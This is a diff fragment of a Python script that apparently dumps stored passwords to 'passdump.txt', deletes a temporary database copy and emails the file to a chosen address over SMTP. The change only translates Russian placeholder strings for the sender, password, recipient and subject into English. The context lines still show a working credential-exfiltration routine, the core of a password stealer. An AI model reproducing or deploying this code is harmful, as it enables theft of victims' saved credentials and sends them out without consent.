@@ -38,8 +38,8 @@ c.close()
 os.remove(os.path.abspath(os.path.split(sys.argv[0])[0]) + "\\tempdatabase")
 
 def send_email(addr_to, msg_subj, msg_text, files):
-    addr_from = "Адрес_почты-отправителя"                       # Sender(Your email-address)
-    password  = "Ваш_пароль_от_почты"                           # Your password
+    addr_from = "sender_address"                       # Sender(Your email-address)
+    password  = "password"                           # Your password
 
     msg = MIMEMultipart()                                   # Creating message
     msg['From']    = addr_from                              # Sender
@@ -81,6 +81,6 @@ def attach_file(msg, filepath):                             # Function to add a 
     file.add_header('Content-Disposition', 'attachment', filename=filename) # Adding headers
     msg.attach(file)                                        # Attaching the file to the message
 
-addr_to   = "Адрес_почты-получателя"                                # Recipient (you can specify the same mail as in the sender to send mail to yourself)
+addr_to   = "adress_to"                                # Recipient (you can specify the same mail as in the sender to send mail to yourself)
 files = ['passdump.txt']                                       # Sending a text file with passwords passdump.txt
-send_email(addr_to, "Тема сообщения", "Текст сообщения", files)
+send_email(addr_to, "Message_subject", "Message_text", files)
